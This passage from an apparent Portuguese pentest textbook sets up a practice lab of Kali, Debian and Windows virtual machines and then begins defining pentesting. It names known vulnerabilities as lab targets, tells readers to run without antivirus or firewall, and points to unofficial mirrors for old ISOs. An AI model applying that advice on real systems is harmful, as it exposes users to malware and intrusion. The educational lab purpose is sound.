imular\tum\tteste\tde\tintrusão\tserá\tcriado\tum\tcenário\tpróximo\tao\treal:\nHaverá\tum\tatacante\tna\trede\tutilizando\to\tKali\tLinux,\tum\tcliente\tutilizando\to\nWindows\te\tum\tservidor\tDebian\tmal\tconfigurado\tna\trede.\tAssim,\tserão\nnecessários\ttrês\tsistemas\toperacionais:\tKali\tLinux,\tWindows\te\tDebian.\nPara\trealizar\ta\tinstalação\tdos\tsistemas\toperacionais,\to\tleitor\ttem\tduas\topções:\n•\tA\tprimeira\té\tinstalar\tcada\tsistema\toperacional\tem\tum\tcomputador\tdiferente.\nCom\tcerteza\té\ta\tmelhor\topção\te\trealmente\tsimulará\tum\tambiente\tbem\npróximo\tao\treal.\tEmbora\tseja\ta\topção\tmelhor\te\tmais\trealista,\to\tleitor\tdeverá\nconfigurar\ttrês\tcomputadores\tdiferentes\tpara\tessa\tatividade.\n•\tA\tsegunda\topção\t–\tacredito\tser\ta\tmais\tsimples\t–\té\tinstalar\tuma\tmáquina\nvirtual\te\tutilizar\tapenas\tum\tcomputador\tpara\tos\tlaboratórios.\tMáquinas\nvirtuais\tsão\tprogramas\tque\tpermitem\ta\tinstalação\tde\tsistemas\toperacionais\n(como\tLinux,\tWindows\te\tUnix)\tdentro\tde\tsi.\tOu\tseja,\tcom\tmáquinas\tvirtuais\né\tpossível\tinstalar\to\tLinux\tem\tum\tWindows\tsem\tque\to\tLinux\tinterfira\tnas\nconfigurações\tdo\tWindows.\tEm\toutras\tpalavras,\té\tpossível\tinstalar,\tremover,\nalterar\to\tLinux\te\ttoda\ta\tsua\testrutura\tsem\tcomprometer,\tem\tabsolutamente\nnada,\to\tWindows\tinstalado\tno\tseu\tHD\tfísico.\tNa\tmáquina\tvirtual\testarão\ninstalados\to\tnosso\tsistema\tservidor\t(Debian)\te\to\tsistema\tatacante\t(Kali\nLinux).\tEmbora\tesse\ttipo\tde\tconfiguração\tnão\tse\tassemelhe\tà\tconfiguração\nde\tuma\trede\te\ta\ttestes\tde\tintrusão,\tesse\tambiente\tpode\tser\tperfeitamente\ncriado\tpara\to\taprendizado\tno\testudo\tde\tpentest,\tpois\to\tintuito\tdo\tlivro\té\nensinar\to\tleitor\tsobre\tas\tferramentas\te\ttécnicas\tutilizadas.\tOs\tmesmos\ttestes\nque\tsão\trealizados\tna\tmáquina\tvirtual\ttambém\tsão\trealizados\tem\tsistemas\nreais.\tA\tutilização\tda\tmáquina\tvirtual\tnão\tinterfere\tem\tnada\tno\taprendizado.\nPor\tpraticidade,\tvamos\tutilizar\ta\tsegunda\topção\te\trealizar\ta\tinstalação\tdos\nsistemas\tDebian\t(servidor)\te\tKali\tLinux\t(atacante)\tem\tuma\tmáquina\tvirtual.\tPara\nos\tlaboratórios,\tconsidero\tque\to\tleitor\tjá\ttenha\tnativamente\to\tWindows\tinstaladono\tseu\tcomputador\t(vítima).\tRealize\to\tdownload\tde\tuma\tmáquina\tvirtual\tpara\npoder\tinstalar\to\tsistema\tservidor\t(Debian)\te\to\tsistema\tatacante\t(Kali\tLinux).\tA\npreferência\tpelo\tsistema\toperacional\tWindows\t7\tse\tdá\tem\trazão\tde\talgumas\nvulnerabilidades\tinerentes\ta\tesse\tsistema,\tcomo\ta\tvulnerabilidade\nms12_020_maxchannelids\n.\n\t\nAlerta:\n\tos\tsoftwares\tutilizados\tneste\tlivro\tforam\tencontrados\tem\trepositórios\tna\tinternet\te\tpodem\tter\norigem\tduvidosa.\tSerão\tutilizados\tunicamente\tpara\tfins\teducacionais,\te\to\tautor\tnão\tse\tresponsabiliza\npelo\tseu\tmau\tuso,\tnem\tpor\tdanos\tque\tesses\tsoftwares\tpossam\tcausar\tem\tsua\tmáquina\te\tem\tmáquina\tde\nterceiros.\n\t\nNão\tinstale\tqualquer\tsoftware\tde\tantivírus\tou\tfirewall,\tpois\talguns\tlaboratórios\npodem\tnão\tfuncionar\tpor\tconta\tdisso.\nPara\tos\tlaboratórios\té\tassumido\tque:\n•\to\tKali\tLinux\ttem\to\tIP\t192.168.1.100.\n•\to\tDebian\ttem\to\tIP\t192.168.1.102.\n•\to\tWindows\ttem\to\tIP\t192.168.1.101.\n•\to\troteador\ttem\to\tIP\t192.168.1.1.\n•\t\nroot@kali#\n\tindica\tque\to\tcomando\tdeve\tser\texecutado\tno\tKali\tLinux.\n•\t\nroot@debian#\t\nindica\tque\to\tcomando\tdeve\tser\texecutado\tno\tDebian.\n•\t\nC:\\\t\nindica\tque\to\tcomando\tdeve\tser\texecutado\tno\tWindows.\n2.2\tObtendo\to\tKali\tLinux\nA\tversão\tmais\tatualizada\tdo\tKali\tLinux\tpode\tser\tencontrada\tem\nhttp://www.kali.org\n.\tApenas\tcomo\tpadronização\tde\tversão\ta\tser\tutilizada,\tserá\nadotada\ta\t1.1.0.\tPor\tser\tmais\tantigo,\to\tsite\toficial\t(\nhttp://www.kali.org\n)\tnão\nfornece\tmais\tdownload.\tUma\trápida\tbusca\tem\tsites\tcomo\to\tGoogle\tretornam\npáginas\tque\tpermitem\to\tdownload\tdessa\tversão,\ttais\tcomo\nhttp://kambing.ui.ac.id/iso/kali/kali-1.1.0\t\nou\t\nhttp://ftp.psu.ru/linux/kali-\nimages/kali-1.1.0\n.\tFaça\to\tdownload\tda\tversão\tapropriada\tpara\to\thardware\tdo\tseu\ncomputador\t(amd64\tou\ti386).\nA\tinstalação\tdo\tKali\tLinux\té\trelativamente\tfácil,\te\tvocê\tpoderá\tinstalá-lo\ndiretamente\tem\tsua\tmáquina,\tem\tuma\tmáquina\tvirtual,\texecutar\tdiretamente\tdeum\tDVD\tou\taté\tmesmo\tem\tum\tdispositivo\tpendrive.\nVeja\ta\tseguir\tas\tprincipais\tformas\tde\tinstalação\tdo\tKali\tLinux,\tassim\tcomo\tos\nseus\tprós\te\tcontras.\tCabe\tao\tleitor\tdecidir\tqual\té\to\tmelhor\tcenário\tpara\tinstalar\te\nutilizar\to\tKali\tLinux:\n•\t\nDVD\n\t–\tApós\to\tdownload\tdo\tsistema\toperacional\t(imagem\tISO\t–\tarquivo\ncom\textensão\t\n.ISO\n\tque\tfará\ttoda\ta\tinstalação\tdo\tKali\tLinux),\teste\tpoderá\tser\ngravado\tem\tum\tDVD\te\tinicializado\tna\tmáquina\ta\tpartir\tdo\tDVD.\tUma\tvez\ninicializada\ta\tpartir\tdo\tDVD,\ta\timagem\tISO\tnão\taltera\tas\tconfigurações\nexistentes\tno\tseu\tcomputador,\te\ttodas\tas\talterações\tefetuadas\tserão\ndescartadas.\tPorém\ta\tpotência\tmáxima\tdo\tseu\tcomputador\tnão\tserá\tutilizada\npara\to\tmelhor\taproveitamento\tdo\tKali\tLinux.\tA\tinstalação\tdo\tKali\tLinux\tem\num\tDVD\té\tvantajosa\tpara\tiniciantes.\n•\t\nUSB\n\t–\tDa\tmesma\tforma\tque\tno\tDVD,\ta\tinstalação\tdo\tKali\tLinux\tem\tum\nUSB\tpermite\ta\tutilização\tdo\tsistema\tsem\ta\tnecessidade\tde\tinstalá-lo\tno\tseu\ncomputador.\tPara\ta\tinstalação\tdo\tKali\tLinux\tem\tum\tUSB\té\tnecessário\to\nprograma\tUNetbootin,\tobtido\tem\t\nhttp://unetbootin.sourceforge.net\n.\n•\t\nHD\n\t–\tO\tKali\tLinux\tpode\tser\tinstalado\tdiretamente\tno\tseu\tcomputador.\nRecomendado\tpara\tusuários\tque\tjá\ttêm\tconhecimento\tem\tLinux.\n•\t\nMáquina\tvirtual\t(VirtualBox)\n\t–\tA\tdesvantagem\tem\texecutar\to\tKali\tLinux\nem\tuma\tmáquina\tvirtual\té\tque\to\tsistema\tfica\tmais\tlento\tem\trelação\tà\ninstalação\tdireta\tno\tcomputador.\tOutra\tlimitação\té\tque\tas\tplacas\tde\tredes\nsem\tfio\tdeverão\tser\tdo\ttipo\tUSB,\tem\trazão\tdas\tpróprias\tlimitações\tda\nmáquina\tvirtual.\tPorém\té\tideal\tpara\tquem\testá\tiniciando\te\tnão\tdeseja\nformatar\to\tseu\tHD.\n2.2.1\tInstalação\tdo\tVirtualBox\nPara\trealizar\ta\tinstalação\tdo\tKali\tLinux,\tprimeiro\tserá\tnecessário\tfazer\to\ndownload\te\ta\tinstalação\tde\tuma\tmáquina\tvirtual.\nAcesse\to\tsite\t\nhttp://www.virtualbox.org\n\te,\tna\taba\t\nDownloads\n,\trealize\to\ndownload\tdo\tVirtualBox\t(Figura\t2.1).\nEscolha\ta\tversão\tdo\tVirtualBox\tmais\tindicada\tpara\to\tsistema\toperacional\tdo\tseu\ncomputador.\tNo\texemplo,\tiniciei\to\tdownload\tdo\tVirtualBox\tpara\to\tWindows\n(Figura\t2.2).A\tprimeira\ttela\té\tuma\ttela\tde\tboas-vindas,\tsolicitando\tao\tusuário\ta\tpermissão\tde\ninstalação\tda\tmáquina\tvirtual\tno\tcomputador.\tAceite\tclicando\tem\t\nNext\n(Próximo)\t(Figura\t2.3).\nFigura\t2.1\t–\tTela\tinicial\tdo\tsite\thttp://www.virtualbox.org.\nFigura\t2.2\t–\tDownload\tdo\tVirtualBox\tpara\to\tsistema\toperacional\tWindows.\nA\tpróxima\ttela\té\treferente\ta\tquais\tmódulos\tdevem\tser\tinstalados\tnoVirtualBox,\npor\texemplo,\tse\ta\tmáquina\tvirtual\tterá\tsuporte\tà\trede,\treconhecimento\tde\ndispositivos\tUSB\te\toutros\t(Figura\t2.4).\tPara\tos\tlaboratórios,\thabilite\ttodos\tos\nmódulos\t(padrão)\te\tclique\tem\t\nNext\n.Figura\t2.3\t–\tTela\tde\tboas-vindas.\nFigura\t2.4\t–\tTela\tpara\tinstalação\tde\tmódulos.\nSelecione\tse\to\tVirtualBox\tterá\tícones\tque\tserão\texibidos\tna\tárea\tde\ttrabalho\te\tno\nmenu\tiniciar\t(deixe\tpor\tpadrão,\tconforme\tindicado\tna\tfigura\t2.5),\te\ttambém\ninstale\ta\tinterface\tde\trede\t(Figura\t2.6).Figura\t2.5\t–\tSelecionando\tse\to\tVirtualBox\tterá\tícones.\nFigura\t2.6\t–\tTela\tpara\tinstalação\tda\tinterface\tde\trede.\nNa\tpróxima\ttela\té\texibida\tuma\tconfirmação\tda\tinstalação\tdo\tVirtualBox;\nfinalize\tas\tinstalações\tclicando\tem\t\nInstall\t\n(Figura\t2.7).Figura\t2.7\t–\tConfirmando\ta\tinstalação\tdo\tVirtualBox.\nO\tVirtualBox\ttambém\tinstala\tmódulos\tauxiliares\tpara\to\treconhecimento\tde\ndispositivos\tUSB,\tinterfaces\tde\trede\tetc.\tO\tprimeiro\tdispositivo\tauxiliar\té\to\nUSB.\tPara\tevitar\tinstalar\tcada\tmódulo,\taceite\tos\tmódulos\tque\to\tVirtualBox\tvai\ninstalar,\tselecionando\to\tcheckbox\t\nConfiar\tsempre\tno\tsoftware\tde\tOracle\nCorporation\n,\te\tdepois\tclique\tem\t\nInstalar\n\t(Figura\t2.8).\nFigura\t2.8\t–\tInstalação\tdos\tmódulos\tauxiliares.\n2.2.2\tInstalação\tde\tuma\tmáquina\tvirtual\nApós\ta\tinstalação\tdo\tVirtualBox,\to\tpróximo\tpasso\té\tinstalar\ta\tmáquina\tvirtual\npara\tutilização\tdo\tKali\tLinux;\tvá\tem\t\nNovo\n\t(Figura\t2.9).Figura\t2.9\t–\tIniciando\ta\tinstalação\tde\tuma\tnova\tmáquina\tvirtual.\nEscolha\tum\tnome\tpara\tsua\tmáquina,\to\tsistema\toperacional\tLinux\te\ta\tversão\n(Figura\t2.10).\nFigura\t2.10\t–\tSelecionando\to\tnome\te\to\ttipo\tde\tsistema\toperacional.\nEscolha\ta\tquantidade\tde\tmemória\tRAM\ta\tser\tutilizada\t(Figura\t2.11).\nParticularmente,\teu\tsempre\tdeixo\tentre\tas\tcores\tverde\te\tlaranja,\tpara\tutilizar\tuma\nboa\tquantidade\tde\tmemória\tRAM.\tDessa\tforma,\ta\tmáquina\treal\tnão\tficará\nsobrecarregada\tdurante\ta\texecução\tdo\tVirtualBox.Figura\t2.11\t–\tDefinindo\to\tvalor\tda\tmemória\tRAM.\nA\tpróxima\ttela\tpermite\tescolher\tqual\tserá\to\ttipo\tde\tarmazenamento\tde\tdados.\tAs\nopções\tsão:\t\nNão\tacrescentar\tum\tdisco\trígido\tvirtual\n\t(útil\tse,\tpor\texemplo,\to\nleitor\tquiser\tiniciar\to\tKali\tLinux\tpor\tmeio\tde\tum\tCD),\t\nCriar\tum\tdisco\trígido\nvirtual\tagora\n,\tou\t\nUtilizar\tum\tdisco\trígido\tvirtual\texistente\n.\tComo\té\tnossa\nprimeira\tinstalação\tdo\tKali\tLinux,\tvamos\tcriar\tum\tdisco\tde\tarmazenamento\nnovo\t(Figura\t2.12).\nFigura\t2.12\t–\tCriando\tum\tnovo\tdisco\tde\tarmazenamento.\nSelecione\ttambém\to\ttipo\tde\tdisco\tde\tarmazenamento\ta\tser\tcriado;\tescolha\ta\nopção\t\nVDI\t(VirtualBox\tDisk\tImage)\n\t(Figura\t2.13).Figura\t2.13\t–\tSeleção\tdo\ttipo\tde\tdisco\tde\tarmazenamento.\nO\tleitor\ttem\ta\topção\tde\tcriar\tum\tdisco\tcom\ttamanho\tfixo\t(nesse\tmodelo\té\nalocado\tdeterminado\tespaço\tdo\tHD)\tou\tcriar\tum\tdisco\tdinamicamente\talocado,\nsendo\tque\tnesse\tmodelo\to\tespaço\tno\tHD\tvai\tsendo\talocado\taté\tatingir\ta\ncapacidade\tmáxima\te\tos\tespaços\tnão\tutilizados\tpela\tmáquina\tvirtual\tpodem\tser\nreutilizados\tpelo\tHD\t(Figura\t2.14).\tParticularmente,\tprefiro\tescolher\ta\topção\nDinamicamente\talocado\n,\tmas\tcabe\tao\tleitor\tdecidir\tqual\tserá\ta\tmelhor\tpara\tsi.\nFigura\t2.14\t–\tSeleção\tdo\ttipo\tde\talocação\tde\tespaço\tdo\tHD.\nAjuste\to\ttamanho\tdo\tdisco\tvirtual\tpara\to\ttamanho\tdesejado\t(Figura\t2.15).\tPara\ta\ninstalação\tdo\tKali\tLinux,\t30\tGB\tsão\tsuficientes.Figura\t2.15\t–\tSelecionando\to\ttamanho\tda\tmáquina\tvirtual.\nInicie\ta\tmáquina\tvirtual\t(Figura\t2.16)\tclicando\tno\tbotão\t\nIniciar\n.\nFigura\t2.16\t–\tMáquina\tvirtual\tsendo\tinicializada.\nCaso\tseja\texibida\tuma\tmensagem\tde\terro\tmostrada\tpelas\tfiguras\t2.17\tou\t2.18,\nprovavelmente\ttrata-se\tdo\tmesmo\tproblema:\tAo\tinicializar\to\tKali\tLinux,\ncertifique-se\tde\thabilitar\to\tsuporte\tao\tmódulo\tPAE/NX\n1\n\t(o\tPAE\tpermite\taos\nprocessadores\tde\t32\tbits\tutilizarem\tmais\tde\t4\tGB\tde\tmemória\tfísica,\te\to\tNX\nprotege\to\tcomputador\tde\tataques\tde\tsoftwares\tmaliciosos).\nFigura\t2.17\t–\tMensagem\tde\terro\tquando\to\tKali\tLinux\té\tinicializado\tsem\to\nsuporte\tao\tPAE/NX.Figura\t2.18\t–\tMensagem\tde\terro\tprovavelmente\trelativo\tao\tPAE/NX.\nPara\tcorrigir\tesse\tproblema,\tvá\tem\t\nConfigurações>Sistema>Processador\n\te\nhabilite\ta\topção\t\nHabilitar\tPAE/NX\n\t(Figura\t2.19).\nFigura\t2.19\t–\tHabilitando\ta\topção\tHabilitar\tPAE/NX.\nLocalize\ta\tISO\tdo\tKali\tLinux\tno\tícone\tda\tpasta\te\tinicie\ta\tmáquina\tvirtual\n(Figura\t2.20)\tclicando\tno\tbotão\t\nStart\n\t(\nIniciar\n).\nFigura\t2.20\t–\tSelecionando\ta\tISO.\nApós\tter\tsido\tinstalada,\ta\tmáquina\tvirtual\tcaptura\to\tmouse,\tque\tficará\tacessível\napenas\tpara\ta\tmáquina\tvirtual\t(Figura\t2.21).Figura\t2.21\t–\tO\tmouse\té\tcapturado\tpara\tdentro\tda\tmáquina\tvirtual.\nPara\to\tmouse\t“sair”\tda\tmáquina\tvirtual\te\tvoltar\tpara\ta\tmáquina\treal,\ttecle\t\nCtrl\n\tà\ndireita\tdo\tteclado.\nSerá\tmostrado\to\tsumário\tde\tconfigurações.\tClique\tno\tinstalador\tgráfico\t(opção\nGraphical\tInstall\n)\tpara\tiniciar\ta\tinstalação\t(Figura\t2.22).\nAs\tpróximas\tconfigurações\tserão\trelativas\tà\tlinguagem,\tlocalidade,\tao\tteclado\te\nnome\tdo\tsistema\toperacional\t(Figuras\t2.23\ta\t2.27).\nFigura\t2.22\t–\tIniciando\ta\tinstalação\tdo\tKali\tLinux.\nFigura\t2.23\t–\tSelecionando\ta\tlinguagem.Figura\t2.24\t–\tOs\tpacotes\tpara\ta\tlíngua\tportuguesa\tnão\testão\tcompletos.\nContinue\ta\tinstalação\tsem\tproblemas.\nFigura\t2.25\t–\tSelecionando\ta\tlocalidade.\nFigura\t2.26\t–\tSelecionando\to\tteclado.Figura\t2.26\t–\tSelecionando\to\tteclado.\nConfigure\to\tnome\tde\tdomínio\tque\tserá\tutilizado,\tpor\texemplo,\tcaso\to\tleitor\ntenha\talgum\tdomínio\tválido\tna\tinternet\te\tdeseje\tfazer\tcom\tque\ta\tmáquina\tvirtual\nesteja\tnesse\tdomínio.\tO\tmais\taconselhado\té\tdeixar\ta\topção\tem\tbranco\t(Figura\n2.28).\nFigura\t2.27\t–\tSelecionando\to\tnome\t(hostname)\tque\to\tcomputador\tterá.\nFigura\t2.28\t–\tOpção\tem\tbranco.\nO\tpróximo\tpasso\té\tdefinir\ta\tsenha\tdo\tsuperusuário\troot\t(usuário\tadministrativo\ndo\tsistema),\tcom\tele\té\tpossível\tapagar\tarquivos,\tcriar\tnovos\tusuários\tetc.\tEm\nresumo,\té\to\tusuário\tcom\tacesso\tpleno\tao\tsistema.\tConfigurar\tsistemas\tLinux\ncom\tsenhas\tdo\tusuário\troot\tcomplexas\t(mesclagem\tentre\tcaracteres,\tnúmeros\te\ndígitos\tespeciais)\té\tfundamental.\tPorém,\tpor\tse\ttratar\tde\tuma\tmáquina\tvirtual\tem\num\tambiente\tde\ttestes,\tconfigure\tuma\tsenha\tfácil\tde\tser\tlembrada\t(Figura\t2.29).Figura\t2.29\t–\tConfigurando\tuma\tsenha\tde\tfácil\tmemorização\tpara\to\nsuperusuário\troot.\nConfigure\to\trelógio\tdo\tsistema\tde\tacordo\tcom\ta\tsua\tlocalização\tgeofísica\n(Figura\t2.30).\nFigura\t2.30\t–\tConfigurando\to\trelógio.\nA\tpróxima\tconfiguração\tdefine\tcomo\tserá\tparticionado\te\tinstalado\to\tKali\tLinux\nno\tdisco\trígido.\tHá\tdiversas\topções:\n•\tUsar\to\tdisco\tinteiro.\tPor\texemplo:\tse\to\tKali\tLinux\tfor\tiniciado\tpor\tCD\tno\ncomputador,\tessa\topção\tusará\ttodo\to\tHD\tpara\tfazer\ta\tinstalação,\tformatando\nos\tdados.\n•\tUtilizar\tLVMs\t(com\te\tsem\tcriptografia).•\tFormatação\te\ta\tinstalação\tdos\tarquivos\tde\tforma\tmanual\t(Figura\t2.31).\nFigura\t2.31\t–\tOpção\t“Assistido\t–\tusar\to\tdisco\tinteiro”:\tinstalação\tmais\tsimples\ne\tautomatizada.\nSerá\texibido\to\tHD\tem\tque\tserá\tinstalado\to\tKali\tLinux\t(Figura\t2.32).\tO\tleitor\npoderá\tinstalar\ttranquilamente\to\tKali\tLinux\tna\tmáquina\tvirtual\tsem\tse\tpreocupar\nse\tessa\tformatação\tapagará\tos\tdados\tdo\tseu\tcomputador,\tpois,\tcomo\tse\ttrata\tde\numa\tmáquina\tvirtual,\tnenhuma\talteração\tafetará\ta\tconfiguração\tdo\tcomputador\n(o\tleitor\tpoderá\tcriar,\texcluir\te\tmover\tdados\te\tarquivos\tdentro\tda\tmáquina\nvirtual).\nNa\tinstalação\tdo\tKali\tLinux\té\tpossível\tescolher\tse\tos\tdiretórios\t(sistema\tFHS)\nserão\tcolocados\tem\tuma\túnica\tpartição,\tse\tapenas\ta\tpartição\t\n/home\n\tserá\ncolocada\tem\tuma\tpartição\tseparada\tou\tse\tas\tpartições\t\n/home\n,\t\n/usr\n,\t\n/var\n\te\t\n/tmp\nserão\tseparadas\tdas\trestantes\t(Figura\t2.33).\tComo\tvamos\tutilizar\to\tKali\tLinux\napenas\tem\tum\tambiente\tde\tteste,\tnão\thá\tnecessidade\tde\tseparamos\tas\tpartições\ndo\tsistema\traiz.\tEntão\tescolha\ta\topção\t\nTodos\tos\tarquivos\tem\tuma\tpartição\t(para\niniciantes)\n.Figura\t2.32\t–\tNa\tinstalação\tdo\tKali\tLinux,\to\tHD\tda\tmáquina\tvirtual\té\nautomaticamente\tdetectado.\nFigura\t2.33\t–\tAs\tpartições\tserão\tcolocadas\tem\tum\túnico\tsistema\tde\tarquivos.\nDepois\tde\tconfigurada\ta\tinstalação\tdo\tKali\tLinux,\tfinalize\tas\tmudanças\nselecionando\ta\topção\t\nFinalizar\to\tparticionamento\te\tescrever\tmudanças\tno\tdisco\n(Figura\t2.34).Figura\t2.34\t–\tSalvando\tas\talterações\tpara\tque\tseja\tiniciada\ta\tinstalação\tdo\nKali\tLinux.\nÉ\texibida\tuma\túltima\tmensagem\tao\tusuário\tpara\tque\tconfirme\tse\ttodas\tas\nconfigurações\testão\tok;\tselecione\ta\topção\t\nSim\n\t(Figura\t2.35).\nFigura\t2.35\t–\tA\tinstalação\tserá\tiniciada\te\tas\talterações\tnão\tpoderão\tser\ndesfeitas.\nCaso\tdeseje,\tutilize\tmirrors\t(espelhos)\tcomo\tmostrado\tna\tfigura\t2.36.Figura\t2.36\t–\tUtilização\tde\tespelhos.\nAo\tutilizar\tespelhos,\to\tKali\tLinux\tsolicita\tinformações\tdo\tproxy.\tNormalmente\nproxies\tsão\tutilizados\tem\tredes\tempresariais\tpara\tcontrole\tde\tacesso\tdos\nusuários.\tSe\ta\tinstalação\tdo\tKali\tLinux\testiver\tsendo\trealizada\tem\tambientes\ndomésticos,\tessa\topção\tpode\tser\tdeixada\tem\tbranco;\tdo\tcontrário,\tcontate\to\nadministrador\tde\tsua\trede\tpara\tque\tele\tforneça\tas\tinformações\tnecessárias\n(Figura\t2.37).\nFigura\t2.37\t–\tA\topção\tde\tproxy\tpode\tser\tdeixada\tem\tbranco\tem\tuma\tinstalação\ndoméstica.\nA\túltima\tetapa\tconsiste\tna\tinstalação\tdo\tgerenciador\tde\tboot\tGRUB\t2,\tque\té\nresponsável\tpor\tinicializar\to\tsistema\toperacional.\tInstale-o\tclicando\tem\t\nSim\n(Figura\t2.38).Figura\t2.38\t–\tInstalação\tdo\tgerenciador\tde\tboot\tGRUB\t2.\nO\tKali\tLinux\tfoi\tdevidamente\tinstalado\tna\tsua\tmáquina\tvirtual.\nNa\ttela\tde\tinicialização\tdo\tKali\tLinux,\tacesse\ta\taba\t\nOutro\n.\tEntre\tcom\to\tusuário\nroot\te\ta\tsua\trespectiva\tsenha\t(Figuras\t2.39\ta\t2.41).\nFigura\t2.39\t–\tAcessando\to\tsistema\tcomo\tOutro.\nFigura\t2.40\t–\tAcesso\tcom\to\tnome\tde\t“root”.Figura\t2.41\t–\tDigitando\ta\tsenha\tdo\tsuperusuário\t“root”.\n2.3\tConfigurando\ta\trede\tno\tKali\tLinux\nPela\tconfiguração-padrão,\tas\tmáquinas\tvirtuais\tsempre\tsão\tselecionadas\tem\nmodo\tNAT\t(nesse\tmodo\ta\tinterface\tde\trede\tdo\tVirtualBox\tpossui\tum\tendereço\nIP\tinválido\tpara\tos\tnossos\tobjetivos).\tPara\tque\tos\texperimentos\tsejam\tefetivos,\nvamos\talterar\tpara\to\tmodo\tBridged\t(nesse\tmodo\ta\tinterface\tde\trede\tdo\nVirtualBox\tconsegue\tobter\tum\tendereço\tIP\tlegítimo\tda\trede),\tque\tpermite\tque\ta\ninterface\t(no\texemplo,\testou\tusando\ta\tinterface\tde\trede\tIntel)\tutilize\to\tmodo\npromíscuo\tselecionando\ta\topção\t\nModo\tPromíscuo\t>\tPermitir\tTudo\n\t(Figura\n2.42).\nFigura\t2.42\t–\tConfiguração\tde\trede\tpara\ta\tmáquina\tvirtual\tKali\tLinux.\n2.4\tTerminal\tde\tcomandos\nPara\ttodos\tos\tlaboratórios\tserá\tutilizado\to\tterminal\tde\tcomandos\t(Shell)\nlocalizado\tem\t\nAplicativos\t>\tAcessórios\t>\tTerminal\tde\tRoot\n\t(Figura\t2.43).Figura\t2.43\t–\tShell\tde\tcomandos\tdo\tKali\tLinux.\n•\tPara\tiniciarmos\to\tserviço\tde\trede,\tdigite\tno\tterminal:\nroot@kali#\n\t/etc/init.d/networking\tstart\n•\tPara\tinterromper\to\tserviço\tde\trede,\tdigite:\nroot@kali#\n\t/etc/init.d/networking\tstop\n•\tPara\tverificar\to\tnúmero\tIP,\tdigite:\nroot@kali#\n\tifconfig\n•\tPara\tatribuir\tnúmero\tIP\tvia\tDHCP\tna\trede,\tdigite:\nroot@kali#\n\tdhclient\teth0\n2.5\tAtualizando\to\tKali\tLinux\nEmbora\tnão\taconselhado\tpara\tos\tlaboratórios\tdo\tlivro,\tdevido\ta\tmudanças\tfeitas\nnos\tsoftwares\tutilizados,\to\tKali\tLinux\tpode\tser\tatualizado.\n•\tConteúdo\tdo\tarquivo\t\n/etc/apt/sources.list\n2\ndeb\thttp://old.kali.org/kali\tmoto\tmain\tnon-free\tcontrib\ndeb-src\thttp://old.kali.org/kali\tmoto\tmain\tnon-free\tcontrib\n•\tPara\tatualizar\to\trepositório\tdos\tprogramas\tque\testão\tno\tKali\t(apt-get):\nroot@kali#\n\tapt-get\tupdate\n•\tPara\tatualizar\tos\tprogramas\tque\testão\tno\tKali\tLinux:\nroot@kali#\t\napt-get\tupgrade\n•\tPara\tatualizar\to\tsistema\toperacional:root@kali#\n\tapt-get\tdist-upgrade\n2.6\tInstalação\tdo\tDebian\nPara\tos\tlaboratórios\ttambém\tdeverá\tser\tinstalado\to\tDebian\t7.4.\tÉ\tuma\tversão\nmais\tantiga\tcom\talguns\tbugs\t(como\to\tshellshock)\tque\tserão\testudados\tnos\nexercícios.\nRealize\to\tdownload\tda\tversão\tdo\tDebian\tapropriada\tpara\to\tseu\tcomputador:\n•\t\nIntel\n:\nhttp://debian.mirror.exetel.com.au/debian-cd/7.4.0/i386/iso-cd/debian-7.4.0-\ni386-netinst.iso\n•\t\nAMD\n:\nhttp://debian.mirror.exetel.com.au/debian-cd/7.4.0/amd64/iso-cd/debian-7.4.0-\namd64-netinst.iso\nA\tinstalação\tdo\tDebian\té\tanáloga\tao\tKali\tLinux.\n2.7\tBackup\tda\tmáquina\tvirtual\nApós\ta\tinstalação\tdo\tKali\tLinux\te\tdo\tDebian,\trecomenda-se\tefetuar\to\tbackup\tda\nmáquina\tvirtual\tsalvando-a\tem\tum\tarquivo\tcom\textensão\t\n.ova\n.\nSelecione\ta\tmáquina\tclicando\tem\tcima\tdo\tnome\tda\tmáquina\t(Figura\t2.44).\nFigura\t2.44\t–\tSelecionando\ta\tmáquina\tvirtual\tem\tque\tserá\tfeito\to\tbackup.\nVá\tem\t\nArquivo\n,\tdepois\tem\t\nExportar\tAppliance\n\t(Figura\t2.45).Figura\t2.45\t–\tExportação\tda\tmáquina\tvirtual.\nCaso\ttenha\tinstalado\tvárias\tmáquinas\tvirtuais,\tselecione\ta\tmáquina\tem\tque\tserá\nfeito\to\tbackup\t(Figura\t2.46).\nFigura\t2.46\t–\tMáquina\tvirtual\tem\tque\tserá\tfeito\to\tbackup.\nNa\tpróxima\ttela\t(Figura\t2.47),\té\tmostrado\tem\tqual\tdiretório\tserá\tsalvo\to\tbackup\nda\tmáquina\tvirtual\t(formato\t\n.ova\n).\tPor\tpadrão\té\tselecionado\to\tdiretório\tde\ndocumentos\tdo\tseu\tusuário.\nFigura\t2.47\t–\tA\tmáquina\tserá\tsalva\tno\tdiretório\tde\tdocumentos\tdo\tusuário.Figura\t2.47\t–\tA\tmáquina\tserá\tsalva\tno\tdiretório\tde\tdocumentos\tdo\tusuário.\nClique\tem\t\nExportar\n\tpara\texportá-la\t(Figura\t2.48).\nFigura\t2.48\t–\tExportação\tda\tmáquina.\nPara\trestaurar\to\tbackup,\tvá\tem\t\nArquivo\t>\tImportar\tAppliance\n\t(Figura\t2.49).\nFigura\t2.49\t–\tImportação\tda\tmáquina.\nSelecione\to\tarquivo\tcom\textensão\t\n.ova\n\te\trealize\ta\trestauração\tda\tmáquina\tvirtual\n(Figuras\t2.50\te\t2.51).\nFigura\t2.50\t–\tSelecionando\to\tarquivo\t.ova\ta\tser\timportado.Figura\t2.50\t–\tSelecionando\to\tarquivo\t.ova\ta\tser\timportado.\nFigura\t2.51\t–\tImportando\tuma\tmáquina\tbackup.\n1\n\tDefinição\tde\tPAE/NX\tsegundo\ta\tMicrosoft.\tFonte:\t\nhttp://windows.microsoft.com/pt-br/windows-8/what-\nis-pae-nx-sse2\n.\n2\n\tFonte:\t\nhttp://docs.kali.org/general-use/kali-linux-sources-list-repositories\n.CAPÍTULO\n\t3\nPentest\n3.1\tO\tque\té\tpentest?\nPenetration\ttesting\tou\tpentest\t(traduzido\tcomo\tteste\tde\tintrusão\tou\tteste\tde\npenetração)\té\tuma\tbateria\tde\ttestes\tmetodológicos\tnormalmente\taplicados\tem\nredes\tde\tcomputadores\te\tsistemas\toperacionais,\tpodendo\tser\tdirecionados\ntambém\ta\twebsites,\tredes\tsem\tfio,\tbancos\tde\tdados,\taplicativos\te\tprogramas,\ncom\to\tobjetivo\tde\tdescobrir,\tmapear\te\texpor\ttodas\tas\tpossíveis\tvulnerabilidades.\nDessa\tforma,\taplicar\te\trealizar\tum\tpentest\ttorna-se\ttarefa